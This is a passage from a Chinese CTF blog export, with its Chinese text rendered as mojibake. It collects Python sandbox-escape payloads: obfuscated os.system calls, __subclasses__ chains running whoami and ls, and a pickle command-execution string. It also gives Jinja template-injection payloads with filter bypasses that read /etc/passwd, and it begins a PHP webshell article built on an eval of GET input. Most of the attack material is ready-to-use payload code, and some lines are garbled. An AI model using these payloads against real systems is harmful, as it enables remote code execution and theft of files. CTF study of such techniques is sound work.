title=\"å…¶ä»–ä¸€äº›å°æŠ€å·§\"></a>å…¶ä»–ä¸€äº›å°æŠ€å·§</h3><ol>\n<li><p>è¿‡æ»¤æ‰æ•´ä¸ªåŒ¹é…è¯­å¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å˜é‡æ›¿æ¢çš„æ–¹å¼</p>\n<p> a = open<br> print(a(â€œd:/test.txtâ€).read())<br>  /etc/djmasl: das jdoas info<br> /<file system> <mount> <type><br> proc   /proc  0 /0 /dev/had2 / errors=dk,aspd 1â€¦</type></mount></file></p>\n</li>\n<li><p>å‡½æ•°åé¢åŠ ç©ºæ ¼ã€æ¢è¡Œéƒ½èƒ½æ‰§è¡Œ</p>\n</li>\n<li><p>å¦‚æœç¨‹åºä¸­è°ƒç”¨äº†ç¬¬ä¸‰æ–¹çš„åº“ï¼Œæ°å¥½è¿™ä¸ªåº“æœ‰æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°</p>\n<p> from numpy.distutils.exec_command import _exec_command as system</p>\n<p> system(â€œls /â€œ)</p>\n</li>\n<li><p>ä½¿ç”¨åˆ«å</p>\n<p> import os as o</p>\n</li>\n<li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p>\n<p> â€œlâ€+â€sâ€</p>\n<p> â€œfunc_globalâ€+â€sâ€</p>\n</li>\n<li><p>å­—ç¬¦ä¸²ç¼–ç æˆ–è€…å…¶ä»–æ“ä½œ</p>\n<p> â€˜X19pbXBvcnRfXw==â€™.decode(â€˜base64â€™) //<strong>import</strong></p>\n<p> <strong>import</strong>(â€˜soâ€™[::-1]).system(â€˜lsâ€™)</p>\n<p> eval(â€˜)â€imaohwâ€(metsys.)â€soâ€(<strong>tropmi</strong>â€˜[::-1])</p>\n<p> exec(â€˜)â€imaohwâ€(metsys.so ;so tropmiâ€™[::-1])</p>\n</li>\n</ol>\n<h2 id=\"é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\"><a href=\"#é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\" class=\"headerlink\" title=\"é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸\"></a>é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸</h2><p>é€šè¿‡ Python çš„ç»§æ‰¿å…³ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æƒ³åˆ©ç”¨çš„æ¨¡å—è¢«æ€äº†ä¹‹åæˆ‘ä»¬æƒ³åŠæ³•æ„é€ ä¸€æ¡åˆ°åŸºç±»çš„é“¾ç„¶åå†è‡ªé¡¶å‘ä¸‹é‡æ–°æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„è·¯æ¥ä½¿ç”¨ç›®æ ‡æ¨¡å—ã€‚ </p>\n<p>python ç±»ä¸­æœ‰ä¸ªå±æ€§å« <strong>mro</strong> ,æ˜¯ä¸ªå…ƒç»„è®°å½•äº†ç»§æ‰¿å…³ç³»ã€‚</p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</code></pre><p>é€šè¿‡æ–‡ç« æœ€å¼€å§‹çš„ä»‹ç»æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡ä½¿ç”¨ <code>__base__</code> æ¥æ‰¾åˆ°åŸºç±» <code>object</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__\n&lt;type &apos;object&apos;&gt;</code></pre><p>ç„¶åä»åŸºç±»å‘ä¸‹å›æº¯ï¼Œä½¿ç”¨ <code>__subclasses__</code></p>\n<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__\n(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__\n&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;\n&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()\n[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>æˆ‘ä»¬å‘ç°ç»“æœå¤ªå¤šäº†ï¼Œç½‘ä¸Šæ‰¾åˆ° bendawang å¸ˆå‚…çš„è„šæœ¬æ¥å¾ªç¯æ‰¾ä¸€ä¸‹</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in [].__class__.__base__.__subclasses__():\n    try:\n        if &apos;os&apos; in item.__init__.__globals__:\n            print cnt,item\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>åˆ©ç”¨è¿™ä¸ªæ¥æ‰¾åˆ° <code>os</code> æ¨¡å—çš„å…¥å£</p>\n<pre><code>#!/usr/bin/env python\n# encoding: utf-8\n\ncnt=0\nfor item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():\n    try:\n        cnt2=0\n        for i in item.__init__.__globals__:\n            if &apos;eval&apos; in item.__init__.__globals__[i]:\n                print cnt,item,cnt2,i\n            cnt2+=1\n        cnt+=1\n    except:\n        print &quot;error&quot;,cnt,item\n        cnt+=1\n        continue</code></pre><p>è¿™ä¸ªç›¸å½“äºæ›´æ·±å…¥ä¸€å±‚æŸ¥æ‰¾</p>\n<p>å­˜åœ¨çš„å­æ¨¡å—å¯ä»¥é€šè¿‡ .index() æ¥è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨è¿”å›ç´¢å¼•</p>\n<pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x ç‰ˆæœ¬ä¸­æœ‰ä¸€ä¸ª warnings </p>\n<pre><code>&gt;&gt;&gt; import warnings\n&gt;&gt;&gt; warnings.os\nTraceback (most recent call last):\n  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;\nAttributeError: &apos;module&apos; object has no attribute &apos;os&apos;\n&gt;&gt;&gt; warnings.linecache\n&lt;module &apos;linecache&apos; from &apos;F:\\python2.7\\lib\\linecache.pyc&apos;&gt;\n&gt;&gt;&gt; warnings.linecache.os\n&lt;module &apos;os&apos; from &apos;F:\\python2.7\\lib\\os.pyc&apos;&gt;</code></pre><p>æˆ‘ä»¬å¯ä»¥</p>\n<pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>ç®€å•çš„ç»™åŸºç±»çš„æ‰€æœ‰æ¨¡å—ç¼–å·</p>\n<pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>å¦‚ä½•ä¾¿æ·çš„æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„å…¥å£</p>\n<pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id=\"å¤§ä½¬ä»¬çš„payload\"><a href=\"#å¤§ä½¬ä»¬çš„payload\" class=\"headerlink\" title=\"å¤§ä½¬ä»¬çš„payload\"></a>å¤§ä½¬ä»¬çš„payload</h3><ol>\n<li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>\n<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>\n</ol>\n<h3 id=\"è¿‡æ»¤ä¸­æ‹¬å·\"><a href=\"#è¿‡æ»¤ä¸­æ‹¬å·\" class=\"headerlink\" title=\"è¿‡æ»¤ä¸­æ‹¬å·\"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>å¦‚æœç¢°åˆ°è¿‡æ»¤ <code>[ ]</code> ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>[]</code> çš„åŠŸèƒ½ç”¨ <code>pop</code> ã€ <code>__getitem__</code>ä»£æ›¿ï¼ˆå®é™…ä¸Š <code>a[0]</code> åœ¨å†…éƒ¨å°±æ˜¯è°ƒç”¨äº† <code>a.__getitem__(0)</code> ï¼‰ï¼Œ<code>pop()</code> å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</p>\n<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id=\"è¿‡æ»¤å¼•å·\"><a href=\"#è¿‡æ»¤å¼•å·\" class=\"headerlink\" title=\"è¿‡æ»¤å¼•å·\"></a>è¿‡æ»¤å¼•å·</h3><p>requests.args æ˜¯ flask ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠ path ä½œä¸ºå˜é‡åå°†åé¢çš„è·¯å¾„ä¼ è¿›æ¥ï¼Œæ¥ç»•è¿‡å¼•å·</p>\n<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id=\"è¿‡æ»¤åŒä¸‹åˆ’çº¿\"><a href=\"#è¿‡æ»¤åŒä¸‹åˆ’çº¿\" class=\"headerlink\" title=\"è¿‡æ»¤åŒä¸‹åˆ’çº¿\"></a>è¿‡æ»¤åŒä¸‹åˆ’çº¿</h3><p>åŒæ ·åˆ©ç”¨  requests.args å±æ€§</p>\n<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id=\"è¿‡æ»¤å…³é”®å­—\"><a href=\"#è¿‡æ»¤å…³é”®å­—\" class=\"headerlink\" title=\"è¿‡æ»¤å…³é”®å­—\"></a>è¿‡æ»¤å…³é”®å­—</h3><p>é™¤äº†ç¼–ç ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥</p>\n<p><code>__getattribute__</code> ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³•</p>\n<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}</code></pre><h2 id=\"å¸¸ç”¨å‡½æ•°\"><a href=\"#å¸¸ç”¨å‡½æ•°\" class=\"headerlink\" title=\"å¸¸ç”¨å‡½æ•°\"></a>å¸¸ç”¨å‡½æ•°</h2><ol>\n<li>func_globals</li>\n</ol>\n<p>è¿”å›åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨-å®šä¹‰å‡½æ•°çš„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</p>\n<ol start=\"2\">\n<li><strong>getattribute</strong></li>\n</ol>\n<p>è¢«è°ƒç”¨æ— æ¡ä»¶åœ°å®ç°ç±»çš„å®ä¾‹çš„å±æ€§è®¿é—®</p>\n<pre><code>object. getattribute(self, name)\n1ï¼‰self å¿…éœ€çš„ã€‚ç±»çš„å®ä¾‹ï¼Œåœ¨è°ƒç”¨æ—¶è‡ªåŠ¨ä¼ é€’ã€‚\n2ï¼‰name å¿…éœ€çš„ã€‚å±æ€§çš„åç§°ã€‚</code></pre><ol start=\"3\">\n<li><strong>subclasses</strong>()[]</li>\n</ol>\n<p>è·å–å­ç±»</p>\n<ol start=\"4\">\n<li>getattr</li>\n</ol>\n<p>è¿”å›å¯¹è±¡çš„å‘½åå±æ€§çš„å€¼</p>\n<pre><code>getattr(object,name) &lt;=&gt; object.name\n&gt;&gt;&gt; class A():\n...     bar =1\n...\n\n&gt;&gt;&gt; a = A()\n\n&gt;&gt;&gt; getattr(a,&apos;bar&apos;)\n1</code></pre><ol start=\"5\">\n<li><strong>name</strong></li>\n</ol>\n<p>ä½¿ç”¨ sys.modules[<strong>name</strong>] è·å¾—æ¨¡å—çš„å¼•ç”¨</p>\n<ol start=\"6\">\n<li><p>timeit</p>\n<p> timeit(å‘½ä»¤ï¼Œnumber=1)</p>\n<p> import timeit<br> timeit.timeit(â€œ<strong>import</strong>(â€˜osâ€™).system(â€˜dirâ€™)â€,number=1) </p>\n</li>\n<li><p>platform</p>\n</li>\n</ol>\n<p>æ¨¡å—å’Œå¹³å°æœ‰å…³ï¼Œä¸»è¦æ˜¯è¿”å›å¹³å°çš„ä¸€äº›ä¿¡æ¯</p>\n<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start=\"8\">\n<li><strong>globals</strong></li>\n</ol>\n<p>å¸¸ä¸ <code>__init__</code> é…åˆä½¿ç”¨ï¼Œ<code>__init__</code> ä¸€èˆ¬è·Ÿåœ¨ç±»çš„åé¢ã€‚ç›¸å½“äºå®ä¾‹åŒ–è¿™ä¸ªç±»</p>\n<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start=\"9\">\n<li><strong>call</strong></li>\n</ol>\n<p>ä½¿å®ä¾‹èƒ½å¤Ÿåƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ <code>x.call() &lt;=&gt; x()</code></p>\n<ol start=\"10\">\n<li>pickle</li>\n</ol>\n<p>å°†å¯¹è±¡å‚¨å­˜åœ¨å­—ç¬¦ä¸²å¯¹è±¡ä¸­ï¼Œå®ç°å¯¹è±¡çš„æŒä¹…åŒ–</p>\n<p>åºåˆ—åŒ–ï¼š</p>\n<pre><code>import pickle\ntest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])\np=pickle.dumps(test)</code></pre><p>ååºåˆ—åŒ–ï¼š</p>\n<pre><code>n=pickle.loads(p)</code></pre><p>æˆ‘ä»¬å¯ä»¥åŠ è½½å‘½ä»¤ï¼š</p>\n<pre><code>pickle.loads(b&quot;cos\\nsystem\\n(S&apos;ls&apos;\\ntR.&quot;)</code></pre><ol start=\"11\">\n<li><p>os/subprocess/commands</p>\n<p>os.system(â€˜ipconfigâ€™)<br>os.popen(â€˜ipconfigâ€™)<br>commands.getoutput(â€˜ipconfigâ€™)<br>commands.getstatusoutput(â€˜ifconfigâ€™)<br>subrocess.call([â€˜ipconfigâ€™],shell=true)</p>\n</li>\n<li><p>eval/exec/execfile</p>\n<p>eval() æ‰§è¡Œ python è¡¨è¾¾å¼æ‰§è¡Œçš„ç»“æœ</p>\n<p>exec() åŠ¨æ€æ‰§è¡Œ python ä»£ç ï¼Œå¯ä»¥æ‰§è¡Œå¤æ‚çš„ python ä»£ç ï¼Œeval åªèƒ½è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼</p>\n<p>execfile() æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶æ˜¯å°†è¢«è§£æä¸º python åºåˆ—çš„ç±»ä¼¼æ¨¡å—çš„æ–‡ä»¶</p>\n</li>\n</ol>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/hester/p/4694499.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href=\"https://www.restran.net/2015/10/22/how-python-code-run/\" target=\"_blank\" rel=\"noopener\">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href=\"https://www.freebuf.com/articles/system/203208.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/203208.html</a><br><a href=\"https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href=\"https://www.zhihu.com/question/38791962?sort=created\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/38791962?sort=created</a></p>\n</blockquote>\n","text":"10/11/2019 2:26:44 PM Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿpython æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªè¢«ä¸¥æ ¼é™åˆ¶äº† python æ‰§è¡Œç¯å¢ƒä¸­è·å–æ›´é«˜çš„æƒé™ï¼Œç”šè‡³ getshell ,è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦ç»•è¿‡å„ç§é™åˆ¶ã€‚ç”±äºç¯å¢ƒä¸­é™åˆ¶äº†è®¸å¤šæ•æ„Ÿæ¨¡å—æ¯”å¦‚","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"ç‰¹æ®Šçš„webshell","slug":"ç‰¹æ®Šçš„webshell","date":"2019-09-27T03:26:55.000Z","updated":"2020-05-09T10:22:00.030Z","comments":true,"path":"api/articles/ç‰¹æ®Šçš„webshell.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"ç‰¹æ®Šçš„webshell\"><a href=\"#ç‰¹æ®Šçš„webshell\" class=\"headerlink\" title=\"ç‰¹æ®Šçš„webshell\"></a>ç‰¹æ®Šçš„webshell</h1><p>å®éªŒç¯å¢ƒ ï¼š<code>php 5.45+nts+apache</code></p>\n<blockquote>\n<p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>\n<p>ä½† php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨file_put_contentså‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥getshellã€‚</p>\n</blockquote>\n<h2 id=\"ä¸åŒ…å«æ•°å­—å­—æ¯\"><a href=\"#ä¸åŒ…å«æ•°å­—å­—æ¯\" class=\"headerlink\" title=\"ä¸åŒ…å«æ•°å­—å­—æ¯\"></a>ä¸åŒ…å«æ•°å­—å­—æ¯</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å¼‚æˆ–\"><a href=\"#å¼‚æˆ–\" class=\"headerlink\" title=\"å¼‚æˆ–\"></a>å¼‚æˆ–</h3><p>å¼‚æˆ–æ˜¯å¯¹å­—ç¬¦çš„ <code>ascii</code>ç è¿›è¡Œé€ä½å¼‚æˆ–ä»¥åå¾—åˆ°ä¸€ä¸ªå¼‚æˆ–ç»“æœ<code>ascii</code>ç çš„å­—ç¬¦ã€‚</p>\n<p>ç¬¬ä¸€ç§æ–¹æ³•å°±æ˜¯è¿™æ ·æ¥ç»•è¿‡æ•°å­—å­—æ¯çš„æ£€æµ‹ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=urldecode(<span class=\"string\">'%01'</span>); <span class=\"comment\">//ascii 0x01</span></span><br><span class=\"line\">$b=urldecode(<span class=\"string\">'`'</span>);   <span class=\"comment\">//ascii 96</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a^$b;\t\t\t <span class=\"comment\">//a</span></span><br><span class=\"line\"><span class=\"number\">96</span>:  <span class=\"number\">0110</span> <span class=\"number\">0000</span></span><br><span class=\"line\">%<span class=\"number\">01</span>: <span class=\"number\">0000</span> <span class=\"number\">0001</span>\t\t <span class=\"comment\">//ç›¸å½“äºascii+1</span></span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬ç»Ÿä¸€é€‰å–  â€˜`â€™  ä½œä¸ºæˆ‘ä»¬å¼‚æˆ–çš„èµ·ç‚¹ï¼Œå› ä¸ºä»–çš„ ascii æ˜¯96ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_=(<span class=\"string\">'%01'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span 